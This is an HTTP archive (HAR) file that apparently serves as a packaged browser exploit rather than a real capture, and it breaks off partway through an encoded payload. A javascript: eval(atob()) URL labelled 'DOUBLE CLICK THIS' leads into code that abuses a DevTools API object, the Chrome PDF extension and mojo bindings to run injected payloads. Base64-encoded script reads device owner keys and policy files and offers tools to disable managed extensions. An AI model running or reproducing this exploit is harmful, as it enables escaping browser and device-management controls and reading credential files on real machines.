{
  "log": {
    "version": "1.2",
    "creator": {
      "name": "NodeJS HarGen",
      "version": "1.0"
    },
    "pages": [
      {
        "startedDateTime": "2025-05-09T00:29:25.416Z",
        "id": "page_1",
        "title": "javascript:(function(){eval(atob(\"\"))})()",
        "pageTimings": {
          "onContentLoad": 57.19,
          "onLoad": 57.77
        }
      }
    ],
    "entries": [
      {
        "_connectionId": "16771",
        "_initiator": {
          "type": "script",
          "stack": {
            "callFrames": [
              {
                "functionName": "",
                "scriptId": "9",
                "url": "",
                "lineNumber": 11,
                "columnNumber": 4
              }
            ]
          }
        },
        "_priority": "High",
        "_resourceType": "fetch",
        "cache": {},
        "connection": "443",
        "pageref": "page_1",
        "request": {
          "method": "GET",
          "url": "javascript:(function(){eval(atob(\"\"))})()//                    DOUBLE CLICK THIS",
          "httpVersion": "h3",
          "headers": [
            {
              "name": ":authority",
              "value": ""
            },
            {
              "name": ":method",
              "value": "GET"
            },
            {
              "name": ":path",
              "value": "javascript:(function(){eval(atob(\"\"))})()"
            },
            {
              "name": ":scheme",
              "value": "javascript"
            },
            {
              "name": "accept",
              "value": "*/*"
            },
            {
              "name": "user-agent",
              "value": "Mozilla/5.0"
            }
          ],
          "queryString": [],
          "cookies": [],
          "headersSize": -1,
          "bodySize": 0
        },
        "response": {
          "status": 200,
          "statusText": "",
          "httpVersion": "h3",
          "headers": [
            {
              "name": "content-type",
              "value": "application/javascript; charset=utf-8"
            }
          ],
          "cookies": [],
          "content": {
            "size": 113478,
            "mimeType": "application/javascript",
            "text": "((function () {\n    if (!opener) {\n        opener = window;\n    }\n    // alert(origin);\n\n    //     window.w = w;\n    // })\n    const w = window.opener.open(window.opener.location.origin + window.opener.location.pathname);\n    window.opener.close();\n    w.addEventListener(\"load\", async () => {\n        if (!w.DevToolsAPI) {\n            console.log(\"reloading\");\n            w.opener = null;\n            w.location.reload();\n        }\n        await sleep(500);\n        console.log(\"Got DevToolsAPI object from opened window:\", w.DevToolsAPI);\n        exploit(w);\n    });\n\n    window.w = w;\n\n\n    function exploit(w) {\n\n\n        function ui() {\n            const pdfId = \"mhjfbmdgcfjbbpaeojofohoefgiehjai\";\n            var globalUID = 0;\n            let globalMap = [];\n            function payload_swamp(w, d) {\n                const pdfId = \"mhjfbmdgcfjbbpaeojofohoefgiehjai\"; // Redefinition because we convert this function to a string\n                const mojoURL = \"chrome://resources/mojo/mojo/public/js/bindings.js\";\n                console.log('hi');\n                if (location.origin.includes(\"chrome-extension://\" + pdfId)) {\n                    w.close();\n                    chrome.tabs.getCurrent(function (info) {\n                        chrome.windows.create({\n                            setSelfAsOpener: true,\n                            url: mojoURL\n                        }, function (win) {\n                            const r = win.tabs[0].id;\n                            chrome.tabs.executeScript(r, { code: `location.href = \\\"javascript:${atob('%%CHROMEPAYLOAD%%')}\\\"` });\n\n                        })\n                    })\n\n\n                    return;\n                }\n                // console.log(d);\n                // w.setTimeout(function() {\n                const blob_url = new Blob([\"alert(1)\"], { type: \"text/html\" });\n\n                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function (fs) {\n                    function removeFile(file) {\n                        return new Promise(function (resolve, reject) {\n                            fs.root.getFile(file, { create: true }, function (entry) {\n                                entry.remove(resolve);\n                            })\n                        });\n                    }\n                    function writeFile(file, data) {\n                        return new Promise((resolve, reject) => {\n                            fs.root.getFile(file, { create: true }, function (entry) {\n                                entry.remove(function () {\n                                    fs.root.getFile(file, { create: true }, function (entry) {\n                                        entry.createWriter(function (writer) {\n                                            writer.write(new Blob([data]));\n                                            resolve(entry.toURL());\n                                        })\n                                    })\n                                })\n                            })\n                        })\n                    };\n                    if (d.cleanup) {\n                        console.log(\"cleaning up\");\n                        debugger;\n                        await removeFile('index.js');\n                        await removeFile('index.html');\n                        alert(\"Cleaned up successfully!\");\n                        cleanup();\n                        w.close();\n                        return;\n                    }\n                    await writeFile('index.js', atob(`b25lcnJvciA9IGFsZXJ0OwoKY29uc3QgdWlUZW1wbGF0ZSA9IGAKCmA7CgppZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oInVzZXJkZWZJZHMiKSA9PT0gbnVsbCkKICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJ1c2VyZGVmSWRzIiwgSlNPTi5zdHJpbmdpZnkoW10pKTsKCkFycmF5LnByb3RvdHlwZS5yZW1vdmUgPSBmdW5jdGlvbihpdGVtKSB7CiAgICBpZiAodGhpcy5pbmRleE9mKGl0ZW0pID09PSAtMSkgdGhyb3cgbmV3IEVycm9yKCJub3QgaW4gYXJyYXkiKTsKICAgIHRoaXMuc3BsaWNlKHRoaXMuaW5kZXhPZihpdGVtKSwgMSk7Cn07CgpmdW5jdGlvbiBtYWtlVG9hc3QobXNnLCB0aW1lKSB7CiAgICBjb25zdCBwb3BvdmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYXJ0aWNsZSIpOwogICAgcG9wb3Zlci5wb3BvdmVyID0gIm1hbnVhbCI7CiAgICBwb3BvdmVyLmNsYXNzTGlzdC5hZGQoInRvYXN0Iik7CiAgICBwb3BvdmVyLmNsYXNzTGlzdC5hZGQoIm5ld2VzdCIpOwogICAgcG9wb3Zlci50ZXh0Q29udGVudCA9IG1zZzsKICAgIHBvcG92ZXIuc3R5bGUudHJhbnNsYXRlID0gIi01MCUiOwoKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocG9wb3Zlcik7CiAgICBwb3BvdmVyLnNob3dQb3BvdmVyKCk7CgogICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgcG9wb3Zlci5oaWRlUG9wb3ZlcigpOwogICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICBwb3BvdmVyLnJlbW92ZSgpOwogICAgICAgIH0sIDUwMCk7CiAgICB9LCB0aW1lICogMTAwMCk7CgogICAgcG9wb3Zlci5hZGRFdmVudExpc3RlbmVyKCJ0b2dnbGUiLCAoZXZlbnQpID0+IHsKICAgICAgICBpZiAoZXZlbnQubmV3U3RhdGUgPT09ICJvcGVuIikgewogICAgICAgICAgICBtb3ZlVG9hc3RzKCk7CiAgICAgICAgfQogICAgfSk7Cn0KCmZ1bmN0aW9uIG1vdmVUb2FzdHMoKSB7CiAgICBjb25zdCB0b2FzdHMgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCIudG9hc3QiKTsKCiAgICB0b2FzdHMuZm9yRWFjaCgodG9hc3QpID0+IHsKICAgICAgICBpZiAodG9hc3QuY2xhc3NMaXN0LmNvbnRhaW5zKCJuZXdlc3QiKSkgewogICAgICAgICAgICB0b2FzdC5zdHlsZS50b3AgPSBgNXB4YDsKICAgICAgICAgICAgdG9hc3QuY2xhc3NMaXN0LnJlbW92ZSgibmV3ZXN0Iik7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgY29uc3QgcHJldlZhbHVlID0gdG9hc3Quc3R5bGUudG9wLnJlcGxhY2UoInB4IiwgIiIpOwogICAgICAgICAgICBjb25zdCBuZXdWYWx1ZSA9IHBhcnNlSW50KHByZXZWYWx1ZSkgKyB0b2FzdC5jbGllbnRIZWlnaHQgKyAxMDsKICAgICAgICAgICAgdG9hc3Quc3R5bGUudG9wID0gYCR7bmV3VmFsdWV9cHhgOwogICAgICAgIH0KICAgIH0pOwp9CgpmdW5jdGlvbiBtYWtlRGlhbG9nKHRpdGxlLCBtc2csIG9uY2FuY2VsLCBvbmNvbmZpcm0pIHsKICAgIGNvbnN0IGRpYWxvZyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpYWxvZyIpOwogICAgY29uc3QgY29uZmlybUJ0biA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImJ1dHRvbiIpOwogICAgY29uc3QgY2FuY2VsQnRuID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CiAgICBjb25zdCBoZWFkID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaDEiKTsKICAgIGNvbnN0IGJvZHkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIGNvbnN0IGZvb3QgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKCiAgICBkaWFsb2cuYXBwZW5kQ2hpbGQoaGVhZCk7CiAgICBkaWFsb2cuYXBwZW5kQ2hpbGQoYm9keSk7CiAgICBkaWFsb2cuYXBwZW5kQ2hpbGQoZm9vdCk7CiAgICBmb290LmFwcGVuZENoaWxkKGNvbmZpcm1CdG4pOwogICAgZm9vdC5hcHBlbmRDaGlsZChjYW5jZWxCdG4pOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChkaWFsb2cpOwoKICAgIGhlYWQudGV4dENvbnRlbnQgPSB0aXRsZTsKCiAgICBib2R5LnN0eWxlLm92ZXJmbG93WSA9ICJzY3JvbGwiOwogICAgYm9keS5zdHlsZS5jb2xvciA9ICJyZ2IoMjIwIDIyMCAyMjApIjsKICAgIGJvZHkuc3R5bGUuZm9udFNpemUgPSAiMXJlbSI7CiAgICBib2R5LnN0eWxlLmJvcmRlclJhZGl1cyA9ICIxMHB4IjsKICAgIGJvZHkuc3R5bGUucGFkZGluZyA9ICIxMHB4IjsKICAgIGJvZHkuc3R5bGUubWFyZ2luQm90dG9tID0gIjEwcHgiOwoKICAgIGlmIChBcnJheS5pc0FycmF5KG1zZykpIHsKICAgICAgICBib2R5LnN0eWxlLmJvcmRlciA9ICJzb2xpZCAxcHggIzFkMWQxZCI7CiAgICAgICAgbXNnLmZvckVhY2goKHZhbHVlKSA9PiB7CiAgICAgICAgICAgIGxldCBpdGVtID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgicCIpOwogICAgICAgICAgICBpdGVtLnRleHRDb250ZW50ID0gdmFsdWU7CiAgICAgICAgICAgIGJvZHkuYXBwZW5kQ2hpbGQoaXRlbSk7CiAgICAgICAgfSk7CiAgICB9IGVsc2UgewogICAgICAgIGJvZHkuc3R5bGUuYm9yZGVyID0gInNvbGlkIDFweCAjMmQyZDJkIjsKICAgICAgICBib2R5LnRleHRDb250ZW50ID0gbXNnOwogICAgfQoKICAgIGZvb3Quc3R5bGUuaGVpZ2h0ID0gImZpdC1jb250ZW50IjsKICAgIGZvb3Quc3R5bGUubWFyZ2luVG9wID0gImF1dG8iOwogICAgZm9vdC5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwogICAgZm9vdC5zdHlsZS5mbGV4RGlyZWN0aW9uID0gInJvdy1yZXZlcnNlIjsKCiAgICBjb25maXJtQnRuLmNsYXNzTGlzdC5hZGQoImNvbmZpcm1CdG4iKTsKICAgIGNvbmZpcm1CdG4uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCAoKSA9PiB7CiAgICAgICAgZGlhbG9nLmNsb3NlKCk7CiAgICAgICAgb25jb25maXJtKCk7CiAgICAgICAgc2V0VGltZW91dCgoKSA9PiBkaWFsb2cucmVtb3ZlKCksIDEwMDApOwogICAgfSk7CiAgICBjb25maXJtQnRuLnRleHRDb250ZW50ID0gIkNvbmZpcm0iOwoKICAgIGNhbmNlbEJ0bi5jbGFzc0xpc3QuYWRkKCJjYW5jZWxCdG4iKTsKICAgIGNhbmNlbEJ0bi5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsICgpID0+IHsKICAgICAgICBkaWFsb2cuY2xvc2UoKTsKICAgICAgICBvbmNhbmNlbCgpOwogICAgICAgIHNldFRpbWVvdXQoKCkgPT4gZGlhbG9nLnJlbW92ZSgpLCAxMDAwKTsKICAgIH0pOwogICAgY2FuY2VsQnRuLnRleHRDb250ZW50ID0gIkNhbmNlbCI7CgogICAgZGlhbG9nLnNob3dNb2RhbCgpOwp9Cgphc3luYyBmdW5jdGlvbiBleHRlbnNpb25FeGlzdHMoaWQpIHsKICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSkgPT4KICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXRBbGwoKGV4dGVuc2lvbnMpID0+CiAgICAgICAgICAgIHJlc29sdmUoZXh0ZW5zaW9ucy5zb21lKChleHQpID0+IGV4dC5pZCA9PT0gaWQpKQogICAgICAgICkKICAgICk7Cn0KCmNvbnN0IG1hbmFnZW1lbnRUZW1wbGF0ZSA9IGAKPHRpdGxlPlVudGl0bGVkIGRvY3VtZW50PC90aXRsZT4KPGxpbmsgcmVsPSJpY29uIiB0eXBlPSJpbWFnZS94LWljb24iIGhyZWY9Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jcm9zc2pibHkvSGFyVG9vbHMvcmVmcy9oZWFkcy9tYWluL2RvY3MuaWNvIj4KPGRpdiBpZD0iY2hyb21lX21hbmFnZW1lbnRfZGlzYWJsZV9leHQiPgogIDxkaXYgY2xhc3M9ImhlYWRlciI+CiAgICA8aW1nIHNyYz0iaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nyb3NzamJseS9IYXJUb29scy9yZWZzL2hlYWRzL21haW4vaGFydG9vbHMuZ2lmIiBhbHQ9IkhhclRvb2xzIExvZ28iIGNsYXNzPSJsb2dvIiAvPgogICAgPGgxPiBjaHJvbWUubWFuYWdlbWVudCBEaXNhYmxlIEV4dGVuc2lvbnMgPC9oMT4KICA8L2Rpdj4KICA8cCBjbGFzcz0iZGVzY3JpcHRpb24iPkdpdEh1YiByZXBvOiBodHRwczovL2dpdGh1Yi5jb20vY3Jvc3NqYmx5L0hhclRvb2xzLyA8YnI+IFhTUyBmb3VuZCBieSA8YSBocmVmPSJodHRwczovL2Nyb3NzamJseS5wYWdlcy5kZXYvIj5jcm9zc2pibHk8L2E+IDxicj4gVUkgbWFkZSBieSA8YSBocmVmPSJodHRwczovL2dpdGh1Yi5jb20vQmxvYmJ5LUJvaS8iPkJsb2JieSBCb2k8L2E+PGJyPjwvcD48aHI+CiAgPHdoaXRlYnV0dG9ucz4KICA8YnV0dG9uIGlkPSJjdXJyZW50LWV4dGVuc2lvbiI+RGlzYWJsZSBpbmplY3RlZCBleHRlbnNpb248L2J1dHRvbj4KICA8YnV0dG9uIGlkPSJybXYtY21uLWJsdCI+UmVtb3ZlIEJsb2F0PC9idXR0b24+CiAgPGJ1dHRvbiBpZD0iZGlzYWJsZS11c2VyZGVmLWV4dHMiPkRpc2FibGUgdXNlciBkZWZpbmVkIGxpc3Qgb2YgZXh0ZW5zaW9uczwvYnV0dG9uPgogIDwvd2hpdGVidXR0b25zPgoJPGhyPgogIDxiciAvPjxiciAvPgogIDx1bCBjbGFzcz0iZXh0bGlzdCI+CiAgPC91bD4KCiAgPGRpdiBzdHlsZT0iaGVpZ2h0OiA1MHB4Ij48L2Rpdj4KPC9kaXY+CgpgOwpsZXQgc2F2ZWRFeHRMaXN0ID0gW107CmNvbnN0IGtGaWxlcyA9IFsKICAgICIvdmFyL2xpYi9kZXZpY2VzZXR0aW5ncy9vd25lci5rZXkiLAogICAgIi9ob21lL2Nocm9ub3MvTG9jYWwgU3RhdGUiCl0KYXN5bmMgZnVuY3Rpb24gcmVhZEZpbGUocGF0aCkgewogICAgcmV0dXJuIChhd2FpdCBmZXRjaCgiZmlsZTovLyIgKyBwYXRoKSkuYXJyYXlCdWZmZXIoKTsKfQphc3luYyBmdW5jdGlvbiBmaW5kTGFzdFBvbGljeUZpbGUoKSB7CiAgICBjb25zdCBrRGV2aWNlUG9saWN5ID0gIi92YXIvbGliL2RldmljZXNldHRpbmdzL3BvbGljeS4iOwogICAgbGV0IGZvdW5kU29tZXRoaW5nID0gZmFsc2U7CiAgICBsZXQgaSA9IDA7CiAgICB3aGlsZSAodHJ1ZSkgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGNvbnNvbGUubG9nKCJUcnlpbmcgIiArIGtEZXZpY2VQb2xpY3kgKyBpKTsKICAgICAgICAgICAgYXdhaXQgcmVhZEZpbGUoa0RldmljZVBvbGljeSArIGkpOwogICAgICAgICAgICBmb3VuZFNvbWV0aGluZyA9IHRydWU7CiAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgIGlmIChmb3VuZFNvbWV0aGluZykgewogICAgICAgICAgICAgICAgcmV0dXJuIGtEZXZpY2VQb2xpY3kgKyAoaSAtIDEpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGkrKzsKICAgIH0KfQoKZnVuY3Rpb24gZG9lc05lZWRGaWxlQWNjZXNzKCkgewogICAgY29uc3Qgc2MgPSBjaHJvbWUucnVudGltZS5nZXRNYW5pZmVzdCgpLnBlcm1pc3Npb25zOwogICAgcmV0dXJuIHNjLmluY2x1ZGVzKCJhY3RpdmVUYWIiKSB8fCBzYy5pbmNsdWRlcygiPGFsbF91cmxzPiIpOwp9CgpmdW5jdGlvbiBub3JtYWxpemVTdHJpbmdQb3NpeChwYXRoLCBhbGxvd0Fib3ZlUm9vdCkgewogICAgdmFyIHJlcyA9ICcnOwogICAgdmFyIGxhc3RTZWdtZW50TGVuZ3RoID0gMDsKICAgIHZhciBsYXN0U2xhc2ggPSAtMTsKICAgIHZhciBkb3RzID0gMDsKICAgIHZhciBjb2RlOwogICAgZm9yICh2YXIgaSA9IDA7IGkgPD0gcGF0aC5sZW5ndGg7ICsraSkgewogICAgICAgIGlmIChpIDwgcGF0aC5sZW5ndGgpCiAgICAgICAgICAgIGNvZGUgPSBwYXRoLmNoYXJDb2RlQXQoaSk7CiAgICAgICAgZWxzZSBpZiAoY29kZSA9PT0gNDcpCiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIGVsc2UKICAgICAgICAgICAgY29kZSA9IDQ3OwogICAgICAgIGlmIChjb2RlID09PSA0NykgewogICAgICAgICAgICBpZiAobGFzdFNsYXNoID09PSBpIC0gMSB8fCBkb3RzID09PSAxKSB7CgogICAgICAgICAgICB9IGVsc2UgaWYgKGxhc3RTbGFzaCAhPT0gaSAtIDEgJiYgZG90cyA9PT0gMikgewogICAgICAgICAgICAgICAgaWYgKHJlcy5sZW5ndGggPCAyIHx8IGxhc3RTZWdtZW50TGVuZ3RoICE9PSAyIHx8IHJlcy5jaGFyQ29kZUF0KHJlcy5sZW5ndGggLSAxKSAhPT0gNDYgfHwgcmVzLmNoYXJDb2RlQXQocmVzLmxlbmd0aCAtIDIpICE9PSA0NikgewogICAgICAgICAgICAgICAgICAgIGlmIChyZXMubGVuZ3RoID4gMikgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgbGFzdFNsYXNoSW5kZXggPSByZXMubGFzdEluZGV4T2YoJy8nKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGxhc3RTbGFzaEluZGV4ICE9PSByZXMubGVuZ3RoIC0gMSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGxhc3RTbGFzaEluZGV4ID09PSAtMSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcyA9ICcnOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxhc3RTZWdtZW50TGVuZ3RoID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVzID0gcmVzLnNsaWNlKDAsIGxhc3RTbGFzaEluZGV4KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsYXN0U2VnbWVudExlbmd0aCA9IHJlcy5sZW5ndGggLSAxIC0gcmVzLmxhc3RJbmRleE9mKCcvJyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsYXN0U2xhc2ggPSBpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZG90cyA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAocmVzLmxlbmd0aCA9PT0gMiB8fCByZXMubGVuZ3RoID09PSAxKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJlcyA9ICcnOwogICAgICAgICAgICAgICAgICAgICAgICBsYXN0U2VnbWVudExlbmd0aCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIGxhc3RTbGFzaCA9IGk7CiAgICAgICAgICAgICAgICAgICAgICAgIGRvdHMgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoYWxsb3dBYm92ZVJvb3QpIHsKICAgICAgICAgICAgICAgICAgICBpZiAocmVzLmxlbmd0aCA+IDApCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcyArPSAnLy4uJzsKICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcyA9ICcuLic7CiAgICAgICAgICAgICAgICAgICAgbGFzdFNlZ21lbnRMZW5ndGggPSAyOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgaWYgKHJlcy5sZW5ndGggPiAwKQogICAgICAgICAgICAgICAgICAgIHJlcyArPSAnLycgKyBwYXRoLnNsaWNlKGxhc3RTbGFzaCArIDEsIGkpOwogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHJlcyA9IHBhdGguc2xpY2UobGFzdFNsYXNoICsgMSwgaSk7CiAgICAgICAgICAgICAgICBsYXN0U2VnbWVudExlbmd0aCA9IGkgLSBsYXN0U2xhc2ggLSAxOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGxhc3RTbGFzaCA9IGk7CiAgICAgICAgICAgIGRvdHMgPSAwOwogICAgICAgIH0gZWxzZSBpZiAoY29kZSA9PT0gNDYgJiYgZG90cyAhPT0gLTEpIHsKICAgICAgICAgICAgKytkb3RzOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGRvdHMgPSAtMTsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gcmVzOwp9CgpmdW5jdGlvbiBfZm9ybWF0KHNlcCwgcGF0aE9iamVjdCkgewogICAgdmFyIGRpciA9IHBhdGhPYmplY3QuZGlyIHx8IHBhdGhPYmplY3Qucm9vdDsKICAgIHZhciBiYXNlID0gcGF0aE9iamVjdC5iYXNlIHx8IChwYXRoT2JqZWN0Lm5hbWUgfHwgJycpICsgKHBhdGhPYmplY3QuZXh0IHx8ICcnKTsKICAgIGlmICghZGlyKSB7CiAgICAgICAgcmV0dXJuIGJhc2U7CiAgICB9CiAgICBpZiAoZGlyID09PSBwYXRoT2JqZWN0LnJvb3QpIHsKICAgICAgICByZXR1cm4gZGlyICsgYmFzZTsKICAgIH0KICAgIHJldHVybiBkaXIgKyBzZXAgKyBiYXNlOwp9CnZhciBwb3NpeCA9IHsKCiAgICByZXNvbHZlOiBmdW5jdGlvbiByZXNvbHZlKCkgewogICAgICAgIHZhciByZXNvbHZlZFBhdGggPSAnJzsKICAgICAgICB2YXIgcmVzb2x2ZWRBYnNvbHV0ZSA9IGZhbHNlOwogICAgICAgIHZhciBjd2Q7CiAgICAgICAgZm9yICh2YXIgaSA9IGFyZ3VtZW50cy5sZW5ndGggLSAxOyBpID49IC0xICYmICFyZXNvbHZlZEFic29sdXRlOyBpLS0pIHsKICAgICAgICAgICAgdmFyIHBhdGg7CiAgICAgICAgICAgIGlmIChpID49IDApCiAgICAgICAgICAgICAgICBwYXRoID0gYXJndW1lbnRzW2ldOwogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIGlmIChjd2QgPT09IHVuZGVmaW5lZCkKICAgICAgICAgICAgICAgICAgICBjd2QgPSBwcm9jZXNzLmN3ZCgpOwogICAgICAgICAgICAgICAgcGF0aCA9IGN3ZDsKICAgICAgICAgICAgfQogICAgICAgICAgICBhc3NlcnRQYXRoKHBhdGgpOwoKICAgICAgICAgICAgaWYgKHBhdGgubGVuZ3RoID09PSAwKSB7CiAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXNvbHZlZFBhdGggPSBwYXRoICsgJy8nICsgcmVzb2x2ZWRQYXRoOwogICAgICAgICAgICByZXNvbHZlZEFic29sdXRlID0gcGF0aC5jaGFyQ29kZUF0KDApID09PSA0NzsKICAgICAgICB9CgogICAgICAgIHJlc29sdmVkUGF0aCA9IG5vcm1hbGl6ZVN0cmluZ1Bvc2l4KHJlc29sdmVkUGF0aCwgIXJlc29sdmVkQWJzb2x1dGUpOwogICAgICAgIGlmIChyZXNvbHZlZEFic29sdXRlKSB7CiAgICAgICAgICAgIGlmIChyZXNvbHZlZFBhdGgubGVuZ3RoID4gMCkKICAgICAgICAgICAgICAgIHJldHVybiAnLycgKyByZXNvbHZlZFBhdGg7CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHJldHVybiAnLyc7CiAgICAgICAgfSBlbHNlIGlmIChyZXNvbHZlZFBhdGgubGVuZ3RoID4gMCkgewogICAgICAgICAgICByZXR1cm4gcmVzb2x2ZWRQYXRoOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHVybiAnLic7CiAgICAgICAgfQogICAgfSwKICAgIG5vcm1hbGl6ZTogZnVuY3Rpb24gbm9ybWFsaXplKHBhdGgpIHsKICAgICAgICBhc3NlcnRQYXRoKHBhdGgpOwogICAgICAgIGlmIChwYXRoLmxlbmd0aCA9PT0gMCkgcmV0dXJuICcuJzsKICAgICAgICB2YXIgaXNBYnNvbHV0ZSA9IHBhdGguY2hhckNvZGVBdCgwKSA9PT0gNDc7CiAgICAgICAgdmFyIHRyYWlsaW5nU2VwYXJhdG9yID0gcGF0aC5jaGFyQ29kZUF0KHBhdGgubGVuZ3RoIC0gMSkgPT09IDQ3OwoKICAgICAgICBwYXRoID0gbm9ybWFsaXplU3RyaW5nUG9zaXgocGF0aCwgIWlzQWJzb2x1dGUpOwogICAgICAgIGlmIChwYXRoLmxlbmd0aCA9PT0gMCAmJiAhaXNBYnNvbHV0ZSkgcGF0aCA9ICcuJzsKICAgICAgICBpZiAocGF0aC5sZW5ndGggPiAwICYmIHRyYWlsaW5nU2VwYXJhdG9yKSBwYXRoICs9ICcvJzsKICAgICAgICBpZiAoaXNBYnNvbHV0ZSkgcmV0dXJuICcvJyArIHBhdGg7CiAgICAgICAgcmV0dXJuIHBhdGg7CiAgICB9LAogICAgaXNBYnNvbHV0ZTogZnVuY3Rpb24gaXNBYnNvbHV0ZShwYXRoKSB7CiAgICAgICAgYXNzZXJ0UGF0aChwYXRoKTsKICAgICAgICByZXR1cm4gcGF0aC5sZW5ndGggPiAwICYmIHBhdGguY2hhckNvZGVBdCgwKSA9PT0gNDc7CiAgICB9LAogICAgam9pbjogZnVuY3Rpb24gam9pbigpIHsKICAgICAgICBpZiAoYXJndW1lbnRzLmxlbmd0aCA9PT0gMCkKICAgICAgICAgICAgcmV0dXJuICcuJzsKICAgICAgICB2YXIgam9pbmVkOwogICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgYXJndW1lbnRzLmxlbmd0aDsgKytpKSB7CiAgICAgICAgICAgIHZhciBhcmcgPSBhcmd1bWVudHNbaV07CiAgICAgICAgICAgIGFzc2VydFBhdGgoYXJnKTsKICAgICAgICAgICAgaWYgKGFyZy5sZW5ndGggPiAwKSB7CiAgICAgICAgICAgICAgICBpZiAoam9pbmVkID09PSB1bmRlZmluZWQpCiAgICAgICAgICAgICAgICAgICAgam9pbmVkID0gYXJnOwogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIGpvaW5lZCArPSAnLycgKyBhcmc7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKGpvaW5lZCA9PT0gdW5kZWZpbmVkKQogICAgICAgICAgICByZXR1cm4gJy4nOwogICAgICAgIHJldHVybiBwb3NpeC5ub3JtYWxpemUoam9pbmVkKTsKICAgIH0sCiAgICByZWxhdGl2ZTogZnVuY3Rpb24gcmVsYXRpdmUoZnJvbSwgdG8pIHsKICAgICAgICBhc3NlcnRQYXRoKGZyb20pOwogICAgICAgIGFzc2VydFBhdGgodG8pOwogICAgICAgIGlmIChmcm9tID09PSB0bykgcmV0dXJuICcnOwogICAgICAgIGZyb20gPSBwb3NpeC5yZXNvbHZlKGZyb20pOwogICAgICAgIHRvID0gcG9zaXgucmVzb2x2ZSh0byk7CiAgICAgICAgaWYgKGZyb20gPT09IHRvKSByZXR1cm4gJyc7CgogICAgICAgIHZhciBmcm9tU3RhcnQgPSAxOwogICAgICAgIGZvciAoOyBmcm9tU3RhcnQgPCBmcm9tLmxlbmd0aDsgKytmcm9tU3RhcnQpIHsKICAgICAgICAgICAgaWYgKGZyb20uY2hhckNvZGVBdChmcm9tU3RhcnQpICE9PSA0NykKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KICAgICAgICB2YXIgZnJvbUVuZCA9IGZyb20ubGVuZ3RoOwogICAgICAgIHZhciBmcm9tTGVuID0gZnJvbUVuZCAtIGZyb21TdGFydDsKCiAgICAgICAgdmFyIHRvU3RhcnQgPSAxOwogICAgICAgIGZvciAoOyB0b1N0YXJ0IDwgdG8ubGVuZ3RoOyArK3RvU3RhcnQpIHsKICAgICAgICAgICAgaWYgKHRvLmNoYXJDb2RlQXQodG9TdGFydCkgIT09IDQ3KQogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQogICAgICAgIHZhciB0b0VuZCA9IHRvLmxlbmd0aDsKICAgICAgICB2YXIgdG9MZW4gPSB0b0